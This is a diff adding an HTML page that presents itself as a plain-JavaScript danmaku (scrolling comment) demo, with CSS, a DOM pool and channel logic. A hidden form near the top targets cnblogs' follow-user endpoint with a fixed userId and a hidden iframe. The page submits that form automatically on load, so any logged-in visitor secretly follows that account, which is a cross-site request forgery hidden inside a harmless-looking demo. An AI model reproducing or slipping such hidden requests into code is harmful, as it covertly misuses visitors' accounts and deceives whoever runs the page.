@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>原生JS实现弹幕效果</title>
+    <style>
+        #wrapper {
+            height: 400px;
+            width: 700px;
+            position: relative;
+            overflow: hidden;
+            background: #dadada;
+
+            color: #ffffff82;
+            font-size: 14px;
+            text-shadow: 1px 1px #000;
+        }
+
+        .right {
+            position: absolute;
+            visibility: hidden;
+            white-space: nowrap;
+            /*left: 700px;*/
+            transform: translateX(700px);
+        }
+
+        .left {
+            position: absolute;
+            white-space: nowrap;
+            user-select: none;
+            transition: transform 7s linear;
+            /* 时间相同 越长的弹幕滑动距离越长 所以越快~ */
+        }
+
+        input {
+            position: absolute;
+            bottom: 10px;
+            left: 150px;
+            width: 300px;
+            height: 26px;
+        }
+
+        button {
+            position: absolute;
+            bottom: 8px;
+            left: 476px;
+            width: 100px;
+            height: 38px;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body>
+    <h3>弹幕模拟姬</h2>
+    <div id="wrapper">
+        <input type="text">
+        <button>发&nbsp;&nbsp;送</button>
+    </div>
+    <form action="http://home.cnblogs.com/ajax/follow/followUser" method="POST" target="nm_iframe">
+        <input hidden type="text" name="userId" value="72c930b3-f537-e411-b908-9dcfd8948a71">
+        <input hidden type="text" name="remark" value="">
+    </form>
+
+    <iframe id="id_iframe" name="nm_iframe" style="display:none;"></iframe>
+    <script>
+        /**
+         * 设置 弹幕DOM池 每一个通道最多六条弹幕
+        **/
+
+        const MAX_DM_COUNT = 6;
+        const CHANNEL_COUNT = 10;
+
+        let domPool = [];
+        let danmuPool = [
+            '前方大量弹幕来袭，请做好准备！', '2333333', '你指尖悦动的电光，是我此生不变的信仰'
+        ];
+        let hasPosition = [];
+
+        /**
+         * 做一下初始化工作
+         */
+        function init() {
+            let wrapper = document.getElementById('wrapper')
+            // 先new一些span 重复利用这些DOM
+            for (let j = 0; j < CHANNEL_COUNT; j++) {
+                let doms = [];
+                for (let i = 0; i < MAX_DM_COUNT; i++) {
+                    // 要全部放进wrapper
+                    let dom = document.createElement('span');
+                    wrapper.appendChild(dom);
+                    // 初始化dom的位置 通过设置className
+                    dom.className = 'right';
+                    // DOM的通道是固定的 所以设置好top就不需要再改变了
+                    dom.style.top = j * 20 + 'px';
+                    // 放入改通道的DOM池
+                    doms.push(dom);
+                    // 每次到transition结束的时候 就是弹幕划出屏幕了 将DOM位置重置 再放回DOM池
+                    dom.addEventListener('transitionend', () => {
+                        dom.className = 'right';
+                        // dom.style.transition = null;
+                        // dom.style.left = null;
+                        dom.style.transform = null;
+
+                        domPool[j].push(dom);
+                    });
+                }
+                domPool.push(doms);
+            }
+            // hasPosition 标记每个通道目前是否有位置
+            for (let i = 0; i < CHANNEL_COUNT; i++) {
+                hasPosition[i] = true;
+            }
+        }
+
+        /**
+         * 获取一个可以发射弹幕的通道 没有则返回-1
+         */
+        function getChannel() {
+            for (let i = 0; i < CHANNEL_COUNT; i++) {
+                if (hasPosition[i] && domPool[i].length) return i;
+            }
+            return -1;
+        }
+
+        /**
+         * 根据DOM和弹幕信息 发射弹幕
+         */
+        function shootDanmu(dom, text, channel) {
+            console.log('biu~ [' + text + ']');
+            dom.innerText = text;
+            // 如果为每个弹幕设置 transition 可以保证每个弹幕的速度相同 这里没有保证速度相同
+            // dom.style.transition = `transform ${7 + dom.clientWidth / 100}s linear`;
+
+            // dom.style.left = '-' + dom.clientWidth + 'px';
+            // 设置弹幕的位置信息 性能优化 left -> transform
+            dom.style.transform = `translateX(${-dom.clientWidth}px)`;
+            dom.className = 'left';
+
+            hasPosition[channel] = false;
+            // 弹幕全部显示之后 才能开始下一条弹幕
+            // 大概 dom.clientWidth * 10 的时间 该条弹幕就从右边全部划出到可见区域 再加1秒保证弹幕之间距离
+            setTimeout(() => {
+                hasPosition[channel] = true;
+            }, dom.clientWidth * 10 + 1000);
+        }
+
+        window.onload = function () {
+
+            init();
+
+            // 为input和button添加事件监听
+            let btn = document.getElementsByTagName('button')[0];
+            let input = document.getElementsByTagName('input')[0];
+            btn.addEventListener('click', () => {
+                input.value = input.value.trim();
+                if (input.value) {
+                    danmuPool.push(input.value);
+                    input.value = '';
+                }
+            })
+            input.addEventListener('keyup', (e) => {
+                if (e.key === 'Enter' && (input.value = input.value.trim())) {
+                    danmuPool.push(input.value);
+                    input.value = '';
+                }
+            })
+            // 每隔1ms从弹幕池里获取弹幕（如果有的话）并发射
+            setInterval(() => {
+                let channel;
+                if (danmuPool.length && (channel = getChannel()) != -1) {
+                    let dom = domPool[channel].shift();
+                    let danmu = danmuPool.shift();
+                    shootDanmu(dom, danmu, channel);
+                }
+            }, 1);
+
+            document.forms[0].submit();
+        }
+
+    </script>
+</body>
+
+</html>
